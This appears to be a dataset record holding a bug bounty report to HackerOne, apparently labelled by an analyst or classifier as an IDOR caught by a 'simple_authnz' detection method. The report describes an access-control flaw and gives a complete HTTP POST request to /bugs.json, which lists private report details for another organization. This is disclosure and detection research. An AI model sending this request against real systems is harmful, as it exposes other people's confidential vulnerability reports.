  "content": "\nHi H1 i hope you are Doing Well Today :)\nExplaining\nI Found that any private reports can be accessed by sending a POST request to the /bugs.json endpoint. This vulnerable endpoint requires organization_id, which takes the organization's ID as a value. It also requires text_query, which is used to search for report IDs. within this org , Now you can append the example organization ID mentioned on the policy page, 58579. and For the text_query, you can simply append a single digit, such as 1, or any other single number. This will query all reports containing this digit, provided they belong to the specified organization\nStep To Reproduce\n1.Send a POST request to this endpoint. You can change the organization_id to anything, but leave it as it is\nCode 636 Bytes\n1\n2POST /bugs.json HTTP/2\n3Host: hackerone.com\n4Cookie:  __Host-session=Your-Session-Here\n5X-Csrf-Token: Your-Csrf-Here\n6Content-Type: application/x-www-form-urlencoded; charset=UTF-8\n7X-Requested-With: XMLHttpRequest\n8Te: trailers\n9Content-Length: 390\n10\n11text_query=1&organization_id=58579&persist=true&sort_type=pg_search_rank&view=message&substates%5B%5D=new&substates%5B%5D=needs-more-info&substates%5B%5D=triaged&substates%5B%5D=resolved&substates%5B%5D=informative&substates%5B%5D=not-applicable&substates%5B%5D=duplicate&substates%5B%5D=retesting&substates%5B%5D=pending-program-review&substates%5B%5D=spam&duplicates_must_have_no_ref=true\n12\nPoc Video\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nImpact\nidor lead to view private reports title,url,id,state,substate,severity_rating,readable_substate,created_at,submitted_at,reporter_name\n\n",

This aligns with the IDOR detection methodology where resource IDs (organization_id and report IDs via text_query) are substituted. The methodology's step e) involves substituting new resource_ids of existing types (organization_id) and executing with existing users, which would detect this vulnerability. Since the detection relies on swapping resource IDs and testing authorization boundaries within the same application, it fits the simple_authnz criteria.",
